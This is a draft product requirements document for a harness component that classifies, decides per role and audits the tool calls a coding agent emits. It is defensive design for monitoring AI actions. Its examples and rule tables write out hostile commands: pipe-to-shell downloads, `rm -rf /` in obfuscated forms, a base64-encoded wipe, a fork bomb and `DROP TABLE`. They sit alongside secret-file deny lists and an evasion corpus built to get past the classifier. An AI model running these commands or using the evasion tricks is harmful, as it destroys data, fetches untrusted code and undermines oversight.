---
id: PRD-016
slug: action-policy-rules
title: Action Policy Rules — Every Tool Call Classified, Decided per Role and Audited Before It Leaves the Harness
status: draft
base_branch: main
epic_branch: epic/PRD-016-action-policy-rules
created: 2026-11-15
updated: 2026-11-15
---

> **Numbering.** The brief is [PRE-PRD-015](../../../pre-prds/PRE-PRD-015-action-policy-rules.md), and the track's briefs, PRD-011 and the code comments call this work **"PRD-015"**. That number went to the OpenAI-compatible endpoint ([PRD-015](../PRD-015-openai-compatible-endpoint/PRD.md)) first, so this one is PRD-016, and tool calling (brief PRE-PRD-016) moves to **PRD-017**. The code's existing `PRD-016` references — six of them runtime strings a `/v1` client can read, such as `"tool calling is not supported (PRD-016)"` — mean *tool calling*, i.e. PRD-017. Comments are left as they are and read through this note; the six runtime strings are retargeted in STORY-002 (D14), because a client reading "PRD-016" would be sent to this document, which does not enable tools.

## 1. Executive Summary

Coding agents do not only produce text; they call tools that write files, run commands and query databases. Every check this harness runs is text-level: duplicate detection, pattern detection and PII redaction all inspect what the caller *says*, and none of them can tell a `SELECT` from a `DROP TABLE users` that the model asks the client to run. Today that gap is closed by refusal — `/v1` rejects `tools` with `tools_not_supported` ([app/services/v1_translate.py](../../../app/services/v1_translate.py)) and the upstream client fails on a `tool_calls` response ([app/services/openrouter_client.py](../../../app/services/openrouter_client.py)). PRD-017 lifts that refusal so OpenCode and Cline work in agent mode. Without an enforcement point for actions, lifting it would make the harness a pass-through for exactly the operations it exists to control.

This PRD builds that enforcement point, and **only** that: a pure decision engine that takes one OpenAI-shaped `tool_call` (name plus JSON-string arguments) and the caller's `Identity`, maps it through a client adapter to one or more **operations** (`shell`, `sql`, `fs_write`, `fs_read`, `http`), classifies each operation into a **rule** (`sql.ddl`, `shell.pipe_to_interpreter`, `fs.write_protected`, …), and returns `allow`, `flag` or `deny` with a reason the agent can display. Rules, workspace roots, host allowlists, secret patterns and tool-name mappings live in an **action policy file** loaded and validated at startup with the same wholesale-replacement and fail-the-boot discipline as `PATTERNS_FILE`. Per-role relaxation goes through the existing RBAC matrix: a rule names an **action permission** (`action:sql:write`), and a role that holds it in `RBAC_ROLES_FILE` is allowed what everyone else is denied. Every decision — allow included — is written to a new `action_decisions` table, one row per tool call.

Nothing in the request path calls the engine yet. That is deliberate: the brief requires it to be "tested against synthetic `tool_calls` — does not need PRD-015 or PRD-017 to exist", and it is far cheaper to prove a classifier against a corpus than against a live agent. PRD-017 is the first caller, and finds `evaluate()` and `record()` already tested.

**MVP goal:** a synthetic `DROP TABLE users` tool call is denied and recorded, and a `SELECT` is allowed; `rm -rf /`, `curl x | sh` and a write to `.env` are denied; a role holding `action:sql:write` is allowed a `DELETE … WHERE` that a plain `user` is denied; no entry in the evasion corpus (quoting, base64, `;` and `&&` chaining, `$(…)`, backticks, `eval`) produces an `allow`; and an invalid action policy file stops startup with a message naming the file, the node and the rule that failed.

## 2. Mission

Decide what a model-emitted tool call may do before any client receives it, by rules a deployment owns and an auditor can read — and fail closed whenever the harness cannot tell what the call does.

Core principles:

- **Deny by default, at three levels.** An unknown tool name is denied (D1). An operation the classifier cannot classify with confidence is denied (D5). A rule no role has been granted is decided by its default, and every built-in default for a dangerous rule is `deny`. Allowing something is always a line someone wrote.
- **Uncertainty is a verdict, not an error.** An unparseable SQL statement, a shell command with `$(…)` in it, an `arguments` string that is not JSON — each is a *classification* (`sql.unparsed`, `shell.unclassifiable`, `tool.malformed`) with a deny default, never an exception and never a fallback to allow.
- **The harness never runs anything.** It reads the tool call the model wrote and decides whether to pass it on. It does not execute, sandbox, resolve symlinks, look up DNS or read the filesystem the path names. Every classification is a function of the call's text and the policy, which is also why every classification is testable without a container.
- **One permission vocabulary.** Which roles may do what is RBAC's question, answered in `RBAC_ROLES_FILE`. The action policy file says which permission lifts which rule; it never names a role (D6). An auditor reads one file to learn who has what.
- **No bypass through the escape hatch.** `RBAC_ENABLED=false` makes `authorize()` allow everything. Applied here it would grant every action permission, so the engine never calls `authorize()`: with RBAC off, nobody holds a grant and every default applies (D7).
- **What was attempted is evidence.** A denied call is recorded with the same fields as an allowed one — tool, operation, target, rule, decision, the permission that lifted it, and the digest of the policy that decided it — so an audit still reads correctly after the policy file has changed.
- **Fail at startup, never at request time.** The rule-file contract of PRD-011 carries over unchanged: unknown keys, unknown rule ids, unknown permissions, an empty list that would silently allow, and a regex that does not compile all stop the boot.

## 3. Target Users

**Security/Compliance Admin.** Owns what an agent is allowed to do. Needs the dangerous classes denied out of the box, the policy reviewable as a document with comments in it, and an audit that shows *what was attempted*: the `DROP TABLE` that was stopped is the incident record, not the `SELECT` that went through.

**Platform Operator.** Owns `.env`, `RBAC_ROLES_FILE` and now `ACTION_POLICY_FILE`. Needs to add the deployment's workspace root and the package registry the build uses, to switch a class to `flag` while it measures false positives, and to have a typo in the file stop the boot rather than reopen everything.

**Integrating Developer (coding agent).** Will point OpenCode or Cline at `/v1` once PRD-017 lands. Needs ordinary work — reading files, editing inside the repository, running `npm test`, `git status`, `pytest` — to go through, and needs a denial to carry a reason the agent can surface ("destructive SQL is not permitted: DROP") rather than a malformed response.

**Data/DBA role holder.** A deployment-defined role whose agent legitimately runs `DELETE … WHERE` against a staging database. Needs that allowed for their role and still denied for everyone else, without a second copy of the policy.

**PRD-017 implementer** (internal). Needs `evaluate(tool_call, identity) -> ActionDecision` and `record(decisions, identity, audit_id)` to exist, be pure where they can be, and be proven against a corpus, so that wiring them into the response path is plumbing and the wire shape of a denial is the only open question (D4).

## 4. MVP Scope

### In Scope

**Operations and adapters (`app/services/action_adapters.py`, new)**
- [ ] `ToolCall(id, name, arguments: str)` — the OpenAI `tool_calls[i]` shape, `arguments` kept as the raw JSON string
- [ ] `Operation(kind, target, source_tool)` with `kind ∈ {shell, sql, fs_write, fs_read, http}`
- [ ] A tool mapping: tool name → operation kind + the argument key that carries the target
- [ ] Built-in mappings for **OpenCode** v1.19.5 (`bash`, `write`, `edit`, `apply_patch`, `read`, `webfetch`, `glob`, `grep`, `lsp`) and **Cline** 4.x, the current client (`run_commands`, `read_files`, `editor`, `apply_patch`, `fetch_web_content`), with the Cline 3.x names that reach `tool_calls` in its native variants (`execute_command`, `write_to_file`, `replace_in_file`, `read_file`, `list_files`, `search_files`, `browser_action`) as additional candidates. Each was verified against the client's tool schema in STORY-001 and is recorded in `tests/corpora/actions/SOURCES.md`. *STORY-001 corrections:* OpenCode's `patch` is now `apply_patch` (`patchText`, with the paths inside the patch text) and `list` was removed. Cline 4.x targets are arrays (`commands[]`, `files[].path`, `requests[].url`) or patch text (`input`). Cline 3.x sends `absolutePath` or `path` depending on the model family. The shapes the mapping must read are listed under *Implications for STORY-004* in `SOURCES.md`.
- [ ] A generic `sql` mapping for common database tool names (`query`, `execute_sql`, `run_sql`) whose single argument holds a statement. *STORY-001:* the key is not the tool name. It is `sql` for `query` (MCP reference Postgres server), and `query` for `execute_sql` (Supabase) and `run_sql` (Timeplus). Through OpenCode and Cline, MCP tools arrive prefixed with the server name (`postgres_query`, `supabase__execute_sql`), so the bare names match only an unprefixed caller or a deployment's own `tools:`.
- [ ] Deployment-defined mappings in the policy file, replacing the built-in set wholesale
- [ ] `arguments` that is not a JSON object, a missing target key, a target that is not a string, or an argument string over `ACTION_MAX_ARGUMENT_CHARACTERS` → `tool.malformed`
- [ ] An unmapped tool name → `tool.unknown`, unless the policy's `opaque_tools` names it (D1)

**Classifiers (`app/services/action_classifiers/`, new package)**
- [ ] `sql.py` — `sqlglot` parse of every statement in the target; statement-type mapping to `sql.read`, `sql.write`, `sql.unscoped_write`, `sql.ddl`, `sql.dcl`, `sql.unparsed` (D2)
- [ ] `shell.py` — POSIX tokenization with `shlex`, segment split on `;`, `&&`, `||`, `|`, `&` and newlines; command-head and flag-combination matching; pipe-to-interpreter detection; `$(…)`, backticks, `eval`, `source`, process substitution, here-strings and unbalanced quoting → `shell.unclassifiable` (D3, D5)
- [ ] Embedded classification: `psql -c`, `mysql -e` and `sqlite3 <db> "<sql>"` hand their statement to the SQL classifier; `curl`, `wget` and `http(ie)` hand their URL to the network classifier; `cat`, `less`, `head`, `tail`, `source`, `printenv`, `env` and `echo $VAR` hand their target to the secret classifier
- [ ] `paths.py` — path normalization (POSIX and Windows separators, drive letters, `..` resolution, `~`), workspace-root containment, protected-path globs → `fs.write_in_workspace`, `fs.write_outside_workspace`, `fs.write_protected`, `fs.read`
- [ ] `network.py` — URL parse, host extraction, IDNA normalization, allowlist match with explicit subdomain wildcards → `net.allowlisted`, `net.unlisted`, `net.unparsed`
- [ ] `secrets.py` — env-var name patterns and secret-file globs, for reads → `secret.read`

**Decision engine (`app/services/action_policy.py`, new)**
- [ ] `evaluate(tool_call, identity, policy=None) -> ActionDecision` — pure, no I/O, no settings read beyond the loaded policy
- [ ] One call can yield several classifications (a shell segment chain, a `curl` that is both shell and network); the decision is the **most severe**, `deny > flag > allow`, with the first such rule in a deterministic order reported (D9)
- [ ] A rule's decision for a caller is its `grant` permission's decision (`allow`) if the caller's role holds that permission in `authz.ROLE_PERMISSIONS`, otherwise its `default`
- [ ] `ActionDecision(tool_call_id, tool_name, operations, decision, rule, reason, granted_by)` — `reason` is a fixed per-rule string safe to show the agent, never config content
- [ ] `evaluate_all(tool_calls, identity)` for a response carrying several calls; each decided independently (what to *do* with a mix is PRD-017 D1)

**RBAC (`app/services/authz.py`)**
- [ ] Six action permissions added to `_KNOWN_PERMISSIONS`: `action:sql:write`, `action:sql:ddl`, `action:shell:exec`, `action:fs:write`, `action:net:egress`, `action:secret:read`
- [ ] No built-in role holds any of them, `admin` included (D6)
- [ ] `holds(identity, permission) -> bool` — a matrix lookup that **ignores** `RBAC_ENABLED` (D7); `authorize()` is unchanged

**Configuration (`app/services/action_config.py`, new; `app/services/strict_yaml.py`, new)**
- [ ] `ACTION_POLICY_FILE` — YAML, loaded once at startup, replacing the built-in policy wholesale
- [ ] Built-in policy: every rule's default and grant, OpenCode/Cline/SQL tool mappings, protected-path and secret patterns; **empty** workspace roots and **empty** host allowlist, so the built-in policy allows relative in-repository writes and denies all egress (Section 6.5)
- [ ] Startup validation: unknown keys, unknown rule ids, a decision outside `allow | flag | deny`, a `grant` outside the six action permissions, a mapping to an unknown operation kind, an empty list where emptiness would silently widen a rule, a glob or regex that does not compile, a relative workspace root
- [ ] `ActionConfigError`, startup fails, never a silent fallback
- [ ] `strict_yaml.safe_load` — `yaml.safe_load` plus duplicate-key rejection, used by `action_config` **and** adopted by `pattern_config` (closing the limit its `load()` docstring records)
- [ ] `policy_digest` — SHA-256 of the canonical loaded policy, recorded on every decision row
- [ ] `action_config.load()` registered in **both** lifespans (`app/main.py`, `chat_ui/chat_ui/chat_ui.py`)

**Audit (`app/db/models.py`, `app/db/database.py`, `app/services/action_audit.py`, new)**
- [ ] New table `action_decisions`, one row per tool call, linked to `audit_logs.id` by a nullable `audit_id` (D8)
- [ ] `record(decisions, identity, audit_id=None, session_id=None) -> list[int]`
- [ ] `arguments_hash` over the full argument string and `arguments_preview` truncated to 500 characters — the `prompt_hash`/`prompt_preview` convention
- [ ] Read functions: recent decisions (all, or one user's), counts by decision

**API and admin console**
- [ ] `GET /audit/actions` — recent decisions, scoped by `audit:read:all` / `audit:read:own` exactly as `GET /audit` is
- [ ] `GET /stats` gains `actions_denied`, `actions_flagged`, `actions_allowed`
- [ ] Admin console: a fourth view, **Actions**, listing recent decisions with decision, rule, tool, target, user and the permission that lifted it, filterable by decision

**Settings (`app/config.py`)**
- [ ] `ACTION_POLICY_FILE: str = ""`, `ACTION_MAX_ARGUMENT_CHARACTERS: int = 100_000`, `ACTION_SQL_DIALECT: str = ""`

**Corpora (`tests/corpora/actions/`, new)**
- [ ] `synthetic/` — tool calls with their declared decision per role: the brief's success criteria plus ordinary agent work that must be allowed
- [ ] `evasion/` — obfuscated variants of denied calls, each asserted **not** to produce `allow`
- [ ] `SOURCES.md` — provenance of every built-in adapter mapping

**Documentation**
- [ ] README and `docs/features.md`: the action policy section, rule table, file format, the permission list, what is and is not classified; `docs/roadmap.md` updated to "built, not yet wired (PRD-017)"
- [ ] `.env.example`: three settings; `examples/action_policy.yaml` as a working sample, loaded by a test

### Out of Scope

- [ ] Wiring the engine into `/v1` or `/query`, and accepting `tools` — PRD-017
- [ ] The wire shape of a denial: dropped call, assistant note, `finish_reason` — PRD-017 (D4)
- [ ] What to return when some calls in a response are denied and others allowed — PRD-017 D1
- [ ] Executing, sandboxing or dry-running any tool; resolving symlinks, DNS or the real filesystem
- [ ] Tool-call streaming
- [ ] MCP server hosting, and classifying `use_mcp_tool` / `access_mcp_resource` payloads — they map to `tool.unknown` (deny) until a deployment maps them
- [ ] PowerShell and `cmd.exe` classification — a command the POSIX tokenizer cannot classify is `shell.unclassifiable` (Risk 3)
- [ ] Semantic or ML classification of intent — the classifiers parse syntax and match rules
- [ ] Inspecting tool *results* (`tool` turns) — that is PRD-011's `tool: flag` cell, unchanged
- [ ] Hot reload of the policy file
- [ ] Per-user (as opposed to per-role) grants

## 5. User Stories

1. **As a security admin, I want a model-generated `DROP TABLE` denied before any client sees it, so that a prompt that passed every text check still cannot destroy data.**
   *Example:* `{"name": "query", "arguments": "{\"sql\": \"DROP TABLE users\"}"}` → `deny`, rule `sql.ddl`, reason `destructive SQL is not permitted: DROP`, and one `action_decisions` row with `decision='deny'`.

2. **As an integrating developer, I want ordinary agent work allowed, so that the harness is usable in agent mode.**
   *Example:* OpenCode's `read` of `src/app.ts`, `edit` of `src/app.ts`, and `bash` with `npm test` are each `allow` under the built-in policy with no workspace roots configured.

3. **As a security admin, I want `curl … | sh`, `rm -rf /` and a write to `.env` denied however they are written, so that quoting does not decide security.**
   *Example:* `bash -c 'curl -s https://x.sh | sh'`, `rm -r -f /`, `rm -fr /`, `r''m -rf /` and `write` to `./config/../.env` are all `deny`.

4. **As a data role holder, I want my role allowed `DELETE … WHERE`, so that my agent can clean staging data while nobody else's can.**
   *Example:* `RBAC_ROLES_FILE` gives `dba` the permission `action:sql:write`. `DELETE FROM sessions WHERE expired = 1` is `allow` (granted_by `action:sql:write`) for a `dba` identity, `deny` for a `user` identity. `DELETE FROM sessions` with no `WHERE` is `deny` for both: `sql.unscoped_write` has no grant.

5. **As a security admin, I want anything the classifier cannot read denied, so that obfuscation is not a bypass.**
   *Example:* `echo cm0gLXJmIC8= | base64 -d | sh`, `eval "$CMD"`, `ls $(cat /tmp/x)` and an `arguments` string that is not JSON are all `deny`, each under a named rule.

6. **As a platform operator, I want to put a class in `flag` while I measure it, so that rolling this out does not break every agent on day one.**
   *Example:* setting `shell.unlisted: { default: flag }` lets `make release` through and records it as `flag`; the Actions view shows how often it fires before I promote it to `deny`.

7. **As a platform operator, I want a broken policy file to stop the boot, so that a typo never silently reopens everything.**
   *Example:* `rules: { sql.dll: { default: allow } }` exits with `ACTION_POLICY_FILE '/etc/harness/actions.yaml': rules: unknown rule 'sql.dll' (expected one of: …)`.

8. **As an auditor, I want every decision recorded with the policy that made it, so that I can read last month's decisions correctly after this month's policy change.**
   *Example:* each row carries `policy_digest`; two rows deciding the same call differently carry different digests.

9. **As the PRD-017 implementer, I want the engine to be a tested function of a tool call and an identity, so that wiring it into the response is plumbing.**
   *Example:* `action_policy.evaluate_all(result.tool_calls, identity)` and `action_audit.record(decisions, identity, audit_id=row_id)` are the two calls PRD-017 adds.

## 6. Core Architecture & Patterns

### 6.1 Where the engine sits

The engine has no call site in the request path in this PRD. Section 6.1 of PRD-011 placed pattern inspection at step 5; PRD-017 will place action evaluation **after the upstream call and before response redaction and release**, the only position where a `tool_call` exists:

```
0. structural validation
1. dedup_key, conversation_key
2. authorize / model / BYOK, usage admission
3. context limits
4. duplicate
5. patterns (PRD-011)
6. redact every message
7. upstream
7b. ACTIONS  <-- PRD-017 adds: evaluate_all(tool_calls, identity); record(...)
8. redact response, audit, return
```

Three properties of that position are fixed by this PRD so PRD-017 does not have to decide them:

- **After authorization.** `evaluate()` takes an `Identity` that has already been authorized for `query:submit`; it is not a second authorization gate for the request, only for the action.
- **Before redaction.** Tool-call arguments are classified as the model wrote them. A path redacted to `<PERSON>` is not the path the client would write to. PRD-017 also guarantees arguments are never redacted on the wire (brief PRE-PRD-016).
- **Independent of the audit row.** `record()` takes an optional `audit_id`, so the decisions can be written after the request's row exists (`log_query` returns the id) without changing `log_query`'s signature.

### 6.2 The model

```python
OperationKind = Literal["shell", "sql", "fs_write", "fs_read", "http"]
Decision = Literal["allow", "flag", "deny"]

@dataclass(frozen=True)
class ToolCall:
    id: str
    name: str
    arguments: str              # the raw JSON string, exactly as the model emitted it

@dataclass(frozen=True)
class Operation:
    kind: OperationKind
    target: str                 # the command, statement, path or URL the rule is about
    source_tool: str

@dataclass(frozen=True)
class Classification:
    rule: RuleId                # e.g. "sql.ddl"
    operation: Optional[Operation]   # None for tool.unknown / tool.malformed
    detail: str                 # the matched fragment: "DROP", "rm -rf", ".env"

@dataclass(frozen=True)
class ActionDecision:
    tool_call_id: str
    tool_name: str
    decision: Decision
    rule: RuleId                # the rule that produced `decision`
    reason: str                 # fixed per-rule template + detail; safe for the agent
    granted_by: Optional[str]   # the action permission that turned deny/flag into allow
    classifications: tuple[Classification, ...]   # every one, for the audit
    policy_digest: str
```

`RuleId` is a closed `Literal`. A rule id that is not in it cannot appear in a policy file (startup error) or be produced by a classifier (a type error, and a test that walks every classifier's outputs).

### 6.3 The rule catalogue

| Rule | Class | Produced when | Built-in default | Grant |
|---|---|---|---|---|
| `sql.read` | SQL | `SELECT`, `WITH … SELECT`, `EXPLAIN`, `SHOW`, `DESCRIBE` | allow | — |
| `sql.write` | SQL | `INSERT`; `UPDATE`/`DELETE` **with** `WHERE`; `MERGE`; `UPSERT` | deny | `action:sql:write` |
| `sql.unscoped_write` | SQL | `UPDATE`/`DELETE` **without** `WHERE`, or with a tautological `WHERE` (`1=1`, `TRUE`, `'a'='a'`) | deny | — |
| `sql.ddl` | SQL | `DROP`, `TRUNCATE`, `ALTER`, `CREATE`, `RENAME`, `COMMENT` | deny | `action:sql:ddl` |
| `sql.dcl` | SQL | `GRANT`, `REVOKE`, role/user statements | deny | — |
| `sql.unparsed` | SQL | `sqlglot` fails, or returns a node type the mapping does not name | deny | — |
| `shell.allowlisted` | Shell | every segment's head is on `shell.allow` and no other rule fires | allow | — |
| `shell.unlisted` | Shell | a segment's head is not on `shell.allow` and no dangerous rule fires | deny | `action:shell:exec` |
| `shell.destructive` | Shell | `rm` with recursive+force on any path, or recursive on `/`, `~`, `*`, `.`; `mkfs`, `dd of=`, `shred`, `chmod -R`/`chown -R` on `/`, `:(){ :\|:& };:` | deny | — |
| `shell.pipe_to_interpreter` | Shell | a pipe whose downstream head is an interpreter (`sh`, `bash`, `zsh`, `python*`, `node`, `perl`, `ruby`, `php`, `pwsh`) | deny | — |
| `shell.inline_interpreter` | Shell | `sh -c`, `bash -c`, `python -c`, `node -e`, `perl -e` — the inner string is classified too | deny | `action:shell:exec` |
| `shell.package_install` | Shell | `npm i/install/add`, `pnpm add`, `yarn add`, `pip install`, `uv add`, `apt*`, `brew install`, `gem install`, `cargo install`, `go install` | deny | `action:shell:exec` |
| `shell.service_control` | Shell | `systemctl`, `service`, `launchctl`, `docker`/`podman` `run/rm/kill/stop`, `kubectl delete/apply`, `reboot`, `shutdown` | deny | `action:shell:exec` |
| `shell.unclassifiable` | Shell | `$(…)`, backticks, `eval`, `source`/`.`, `<(…)`, `>(…)`, `<<<`, unbalanced quotes, a head that is a variable (`$CMD`), a head that is a path to an interpreter under another name | deny | — |
| `fs.read` | Filesystem | a read whose target matches no secret pattern | allow | — |
| `fs.write_in_workspace` | Filesystem | a write inside a workspace root (or relative, not escaping) and not protected | allow | — |
| `fs.write_outside_workspace` | Filesystem | a write outside every workspace root, or a relative path whose `..` escapes | deny | `action:fs:write` |
| `fs.write_protected` | Filesystem | a write to a protected glob: `.env*`, `*.pem`, `*.key`, `id_*`, `.aws/**`, `.ssh/**`, `.git/**`, `.github/workflows/**`, `.gitlab-ci.yml`, `Jenkinsfile`, `.circleci/**` | deny | — |
| `net.allowlisted` | Network | the URL's host matches `network.allow` | allow | — |
| `net.unlisted` | Network | a parseable URL whose host is not on `network.allow` | deny | `action:net:egress` |
| `net.unparsed` | Network | no scheme/host, a non-`http(s)` scheme, userinfo in the URL, or an IDNA failure | deny | — |
| `secret.read` | Secret | a read (file, `cat`, `printenv`, `env`, `echo $X`) of a secret file glob or an env name matching a secret pattern (`*KEY*`, `*SECRET*`, `*TOKEN*`, `*PASSWORD*`, `*CREDENTIAL*`, `AWS_*`, `OPENROUTER_*`) | deny | `action:secret:read` |
| `tool.unknown` | Tool | the tool name is in no mapping and not in `opaque_tools` | deny | — |
| `tool.opaque` | Tool | the tool name is in `opaque_tools`: allowed **without classification** | (per entry) | — |
| `tool.malformed` | Tool | `arguments` not a JSON object, target key missing or not a string, over `ACTION_MAX_ARGUMENT_CHARACTERS` | deny | — |

**A rule with no grant cannot be lifted by any role.** Those are the classes where no business reason survives inspection — an unscoped `DELETE`, a pipe to `sh`, a write to `.env`, anything the classifier cannot read. A deployment that disagrees can change the rule's `default` in its own file, in writing, where an auditor will see it; it cannot do it through a role.

### 6.4 Severity and determinism (D9)

A single tool call can produce several classifications: `npm test && rm -rf build` is two segments; `curl https://evil.example/x` is `shell.unlisted` *and* `net.unlisted`; `psql -c "DROP TABLE t"` is a shell head *and* `sql.ddl`. Each classification is decided (grant, else default), and the call's decision is the most severe of them, `deny > flag > allow`. The reported `rule` is the **first** classification at that severity, in this order: segments left to right, and within a segment the embedded classification (SQL, network, secret) before the head's own rule — because "destructive SQL" is a more useful reason than "psql is not on the allowlist". Every classification is kept on the decision and written to the audit, so nothing the classifier saw is lost to the summary.

`tool.opaque` is the only rule that ends classification: the operator has said "this tool's arguments are not ours to read". It is recorded with its configured decision, which may itself be `flag`.

### 6.5 The workspace and the allowlists

The harness does not know the agent's working directory. Section 6.5's rules, stated once:

1. A path is normalized first: `\` → `/`, a drive letter lowercased, `~` left as the literal `~` segment (which no workspace root contains), repeated `/` collapsed, `.` removed, `..` resolved lexically. No filesystem access, no symlink resolution (Risk 4).
2. A **relative** path whose normalization does not escape above its start is inside the workspace. Coding agents run in the repository, and every surveyed client's executor accepts a relative path and resolves it against the working directory (Cline 3.x's generic tool specs ask for one). Treating them as outside would deny every edit.
3. A relative path that escapes (`../../etc/passwd`) is `fs.write_outside_workspace`.
4. An **absolute** path is inside only if it is under one of `workspace.roots`. The built-in list is **empty**, so with no configuration every absolute-path write is outside. OpenCode and Cline 4.x ask the model for absolute paths (`tests/corpora/actions/SOURCES.md`), so a deployment of either must set its root — the README says so in the setup steps, and `examples/action_policy.yaml` shows it.
5. Protection is checked **before** containment: `.env` inside the workspace is still `fs.write_protected`.

The network allowlist is empty in the built-in policy for the same reason — egress to anything is a decision the deployment writes. Entries are exact hosts (`registry.npmjs.org`) or explicit wildcards (`*.githubusercontent.com`, which matches subdomains and **not** the apex); an IP literal matches only if written as one. `localhost`, `127.0.0.0/8`, `::1`, link-local and the cloud metadata address `169.254.169.254` are never matched by a wildcard, only by an exact entry.

### 6.6 The policy file

```yaml
# examples/action_policy.yaml
workspace:
  roots:
    - /home/dev/projects          # OpenCode and Cline 4.x send absolute paths

network:
  allow:
    - registry.npmjs.org
    - pypi.org
    - files.pythonhosted.org
    - "*.githubusercontent.com"

shell:
  allow:                          # command heads allowed outright (shell.allowlisted)
    - ls
    - cat
    - git
    - npm test                    # a multi-token head matches the first N tokens
    - npx tsc
    - pytest
    - grep
    - rg

rules:                            # only the rules you change; the rest keep their built-in default
  shell.unlisted:
    default: flag                 # rollout: measure before denying
  sql.write:
    default: deny
    grant: action:sql:write

tools:                            # replaces the built-in mapping wholesale when present
  bash:          { kind: shell,    target: command }
  write:         { kind: fs_write, target: filePath }
  edit:          { kind: fs_write, target: filePath }
  read:          { kind: fs_read,  target: filePath }
  webfetch:      { kind: http,     target: url }
  apply_patch:   { kind: fs_write, target: patchText, format: patch }  # paths are read from the patch headers
  run_sql:       { kind: sql,      target: query }

opaque_tools:                     # allowed without reading their arguments
  todowrite: allow

secrets:
  env: ["*KEY*", "*SECRET*", "*TOKEN*", "*PASSWORD*", "*CREDENTIAL*", "AWS_*", "OPENROUTER_*"]
  files: [".env*", "*.pem", "*.key", "id_*", ".aws/**", ".ssh/**", ".npmrc", ".pypirc"]
```

**Two replacement rules, and why they differ.** Every *section* that is present replaces the built-in section wholesale — `tools`, `shell.allow`, `network.allow`, `secrets`, `workspace.roots` — for `authz.load()`'s reason: a merge means an operator who deletes an entry still has it in force. **`rules` is the exception: it is merged per rule id.** The rule catalogue is the security floor; a file that wanted to change one default and had to restate twenty-five rules would be a file where a forgotten rule silently fell back to … nothing, because there is no sensible "absent" for a rule. So an omitted rule keeps its built-in default and grant, and a present one overrides only the fields it states: a field left out keeps its built-in value, and `grant: null` removes a grant explicitly (orchestrator decision, STORY-007 plan). That makes the file's `rules:` section a list of *deviations from the floor*, which is what an auditor wants to read.

**Empty means empty, never "use the default".** `shell.allow: []` is valid and means nothing is allowlisted. `tools: {}` is a startup error — a file that maps no tools denies every call, which must be written as `opaque_tools: {}` plus intent, not arrived at (T7).

**Strict YAML.** `strict_yaml.safe_load` is `yaml.safe_load` with a loader subclass whose mapping constructor rejects duplicate keys. `pattern_config.load()`'s docstring records that PyYAML keeps the last of two duplicate keys silently and says "if a second YAML config arrives (PRD-015), a shared strict loader is the place to fix it once". This is that config, and that fix: `pattern_config` adopts the shared loader in STORY-005. A `PATTERNS_FILE` with a duplicate key, which loaded before, now stops startup — named in the README as the one behaviour change to PRD-011.

### 6.7 RBAC grants (D6, D7)

```python
# app/services/authz.py
PERMISSION_ACTION_SQL_WRITE = "action:sql:write"
PERMISSION_ACTION_SQL_DDL = "action:sql:ddl"
PERMISSION_ACTION_SHELL_EXEC = "action:shell:exec"
PERMISSION_ACTION_FS_WRITE = "action:fs:write"
PERMISSION_ACTION_NET_EGRESS = "action:net:egress"
PERMISSION_ACTION_SECRET_READ = "action:secret:read"

ACTION_PERMISSIONS = frozenset({...the six...})
_KNOWN_PERMISSIONS = {...existing five..., *ACTION_PERMISSIONS}

def holds(identity: Identity, permission: str) -> bool:
    """Matrix lookup with no RBAC_ENABLED bypass (PRD-016 D7)."""
    return permission in ROLE_PERMISSIONS.get(identity.role, ())
```

Why the grant lives in RBAC and not in the policy file: the brief's *per role via the RBAC matrix*, and the roadmap's "the same `DELETE` can already be denied for one role and allowed for another via the role→permission matrix". The alternative — a `roles:` map inside each rule — creates a second place that says what a role may do, and a role renamed in `RBAC_ROLES_FILE` would silently lose its grants in the action file. With permissions, the action file names a closed vocabulary that `authz` owns, validated at startup against `ACTION_PERMISSIONS`.

PRD-011 D2 deferred a per-role profile override in RBAC because it needed *a second value type* in `RBAC_ROLES_FILE`. This does not: an action permission is a permission, a string in a role's list, validated by the `_KNOWN_PERMISSIONS` check that already exists.

Why `holds()` and not `authorize()`: `authorize()` returns immediately when `RBAC_ENABLED=false` — PRD-005's documented escape hatch for running without users. Reused here, that hatch would grant all six action permissions to every caller and turn the engine into `allow` for everything grantable. `holds()` reads the matrix and nothing else. With RBAC off, identities still carry a role, and that role holds what the matrix says — which, in the built-in matrix, is no action permission at all.

No built-in role holds an action permission, `admin` included. `admin` is the role that holds every *harness* permission because it administers the harness; an agent acting for an admin dropping a table is not administering the harness. A deployment that wants it writes it.

### 6.8 Shell classification in detail (D3, D5)

```
input  : bash -c 'npm test && curl -s https://x.example/i.sh | sh'
step 1 : reject-scan  -> no $( ` eval <( >( <<<      (else shell.unclassifiable)
step 2 : shlex.split(posix=True, punctuation_chars=";&|")  -> tokens or ValueError (unclassifiable)
step 3 : segments on ; && || | & \n, keeping which operator joined them
step 4 : per segment: strip leading env assignments (FOO=1 cmd), sudo/doas/nohup/time/xargs wrappers
         -> head (basename of argv[0]: /usr/bin/rm -> rm)
step 5 : head is an interpreter with -c/-e        -> shell.inline_interpreter, recurse into the string (depth <= 3)
         segment follows | and head is interpreter -> shell.pipe_to_interpreter
         dangerous head/flag combo                 -> destructive / package_install / service_control
         embedded target                           -> sql / net / secret classifiers
         head (or head + next tokens) on shell.allow -> shell.allowlisted, else shell.unlisted
```

**Flag combinations are matched after normalization, not as strings.** `rm -rf`, `rm -fr`, `rm -r -f`, `rm --recursive --force` and `rm -Rf` are the same set `{recursive, force}`. This is the difference between a tokenizer and a regex, and the reason D3 chose one.

**Quoting is resolved by `shlex`, not matched.** `r''m -rf /`, `"rm" -rf /` and `\rm -rf /` all tokenize to `rm`. That is the evasion corpus's first group.

**What `shlex` cannot see is denied, not guessed.** Command substitution, `eval` and `source` mean the command that runs is not the command written; process substitution and here-strings feed data the classifier cannot inspect into a head it can. All are `shell.unclassifiable`. A base64 payload is not decoded: `base64 -d` piped into an interpreter is already `shell.pipe_to_interpreter`, and `base64 -d > x.sh` followed by `sh x.sh` is two segments — the second is `sh` with a file argument, which `shell.allow` does not list, so it is at least `shell.unlisted`, and an interpreter run on a file is classified `shell.inline_interpreter` (its contents are unreadable).

**Recursion is bounded.** `bash -c "bash -c '…'"` recurses at most three levels; deeper nesting is `shell.unclassifiable`.

### 6.9 SQL classification in detail (D2)

